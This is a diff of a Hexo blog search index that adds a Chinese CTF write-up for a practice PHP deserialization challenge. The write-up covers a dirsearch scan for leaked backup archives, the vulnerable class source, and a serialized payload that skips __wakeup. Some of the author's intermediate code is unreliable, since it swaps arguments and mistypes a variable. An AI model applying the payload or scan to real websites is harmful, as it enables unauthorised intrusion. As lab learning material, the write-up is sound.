@@ -10,6 +10,8 @@
 <li><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4></li>
 </ul>
 <p>一串字符，没有什么奇怪的符号，base家族挨个试一下，发现base16能解码出flag（只有前几个大写字母，大概率是base16）。</p>
+<a id="more"></a>
+
 <ul>
 <li><h4 id="不说人话？"><a href="#不说人话？" class="headerlink" title="不说人话？"></a>不说人话？</h4></li>
 </ul>
@@ -96,6 +98,8 @@
     <title>Hello World</title>
     <url>/2020/12/11/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<a id="more"></a>
+
 <h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
@@ -115,6 +119,89 @@
     <url>/2020/12/12/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%9B%AD/</url>
     <content><![CDATA[<h2 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h2><p>普通高校的菜鸡学生，CTF未入门选手。</p>
 <h2 id="搞什么？"><a href="#搞什么？" class="headerlink" title="搞什么？"></a>搞什么？</h2><p><del>被迫</del>搭博客写wp，虽然很无奈但是也挺好的吧。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>2019]PHP</title>
+    <url>/2020/12/12/Web-1%20buuoj%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DPHP/</url>
+    <content><![CDATA[<h2 id="buuoj-极客大挑战-2019-PHP1"><a href="#buuoj-极客大挑战-2019-PHP1" class="headerlink" title="buuoj[极客大挑战 2019]PHP1"></a>buuoj[极客大挑战 2019]PHP1</h2><blockquote>
+<ul>
+<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
+<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
+<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
+</ul>
+</blockquote>
+<ul>
+<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
+<li><p>拿到网页，没有输入框，注入暴力算是无了？</p>
+</li>
+<li><p>f12瞅一下，没什么有用的东西。</p>
+</li>
+<li><p>提示说有备份，那就拿扫描器扫一下，发现有个<a href="http://www.zip/">www.zip</a></p>
+</li>
+<li><p>解压得到一个假的flag.php，但得到的index.php和class.php是有用的，根据其中的提示判定应该是个PHP反序列化漏洞，那么这要构造相应的字符串就搞定了。</p>
+</li>
+</ol>
+</li>
+<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="1-dirsearch的安装和使用"><a href="#1-dirsearch的安装和使用" class="headerlink" title="1. dirsearch的安装和使用"></a>1. dirsearch的安装和使用</h4><p> <del>原来这玩意在windows下装完就能用了。</del></p>
+<p> cmd切到dirsearch所在的目录，然后运行命令</p>
+<p><code>py dirsearch.py -u (题目连接) -s 3</code></p>
+<p>加上“-s 3“是因为默认设置扫的太频繁，然后就会：</p>
+<p><img src="E:\Typora\makedown\web-1(1).png" alt="报错"></p>
+<p>虽然加个延迟会慢一些但至少能扫出来<a href="http://www.zip/">www.zip</a>.</p>
+</li>
+</ul>
+<h4 id="2-关于网页的备份文件"><a href="#2-关于网页的备份文件" class="headerlink" title="2.关于网页的备份文件"></a>2.关于网页的备份文件</h4><p>  网站备份压缩文件泄露，是因为备份了网站源码讲其保存成zip等压缩格式。</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;.rar&#39;,&#39;.zip&#39;,&#39;.tar&#39;,&#39;.tar.bz2&#39;,&#39;.sql&#39;,&#39;.7z&#39;,&#39;.bak&#39;,&#39;.txt&#39;</span><br></pre></td></tr></table></figure>
+
+<p>  如果我们这里要进行检测和利用的话，首先要有一个字典，这个字典的精度越高，那么判断效果越好。</p>
+<p>  最常见的就是<a href="http://www.zip/">www.zip</a></p>
+<p>  （所以做题没有头绪时扫一下可能会有惊喜）</p>
+<h4 id="3-关于PHP反序列化漏洞"><a href="#3-关于PHP反序列化漏洞" class="headerlink" title="3.关于PHP反序列化漏洞"></a>3.关于PHP反序列化漏洞</h4><p>  <strong>PHP序列化与反序列化</strong></p>
+<p>  PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。</p>
+<p>  下面是比较典型的PHP反序列化漏洞中可能会用到的魔术方法：</p>
+<p>  void __wakeup ( void )</p>
+<p>  unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
+<p>  void __construct ([ mixed $args [, $… ]])</p>
+<p>  具有构造函数的类会在每次创建新对象时先调用此方法。</p>
+<p>  void __destruct ( void )</p>
+<p>  析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
+<p>  public string __toString ( void )</p>
+<p>  __toString( ) 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj;应该显示些什么。</p>
+<p>  此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
+<p>   （摘自i春秋）</p>
+<p>  说人话就是PHP通过序列化和反序列化的方法将对象转化为字符串方便传输，有又因为在反序列化的过程中PHP对象会执行magic函数，因此我们可以通过构造特定的字符串控制函数，一步一步拿到flag。</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看来只需要构造一个Name对象，使其password=100,username=admin，就能触发显示flag的条件了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&amp;a = <span class="keyword">new</span> Name(<span class="number">100</span>,admin);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出构造好的字符串</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Namepassword&quot;;s:5:&quot;admin&quot;;s:14:&quot;Nameusername&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然鹅这还不够</p>
+<h5 id="问题1-private的处理"><a href="#问题1-private的处理" class="headerlink" title="问题1.private的处理"></a>问题1.private的处理</h5><p>对public，protected，private三种声明方式没有区分，实际上每种都有不同格式要求</p>
+<p>public:         O:4:”Name”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p>
+<p>protected:  O:4:”Name”:2:{s:11:” * username”;s:5:”admin”;s:11:” * password”;i:100;}</p>
+<p>private:       O:4:”Name”:2:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}</p>
+<h5 id="问题2-wakeup函数的绕过"><a href="#问题2-wakeup函数的绕过" class="headerlink" title="问题2.__wakeup函数的绕过"></a>问题2.__wakeup函数的绕过</h5><p>PHP中的小规则，如果传入字符串中的对象应有的变量个数比实际的多（在字符串的表示中），那程序会自动跳过wakeup的执行。</p>
+<p>因此需要把串改为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后以get方式提交一下，获得flag。</p>
+<ul>
+<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
+<li><p>dirsearch的安装和使用</p>
+</li>
+<li><p>PHP反序列化漏洞的利用</p>
+</li>
+<li><p>一丢丢的PHP编程（我连PHP都不会 ）</p>
+</li>
+</ol>
+</li>
+</ul>
 ]]></content>
   </entry>
 </search>
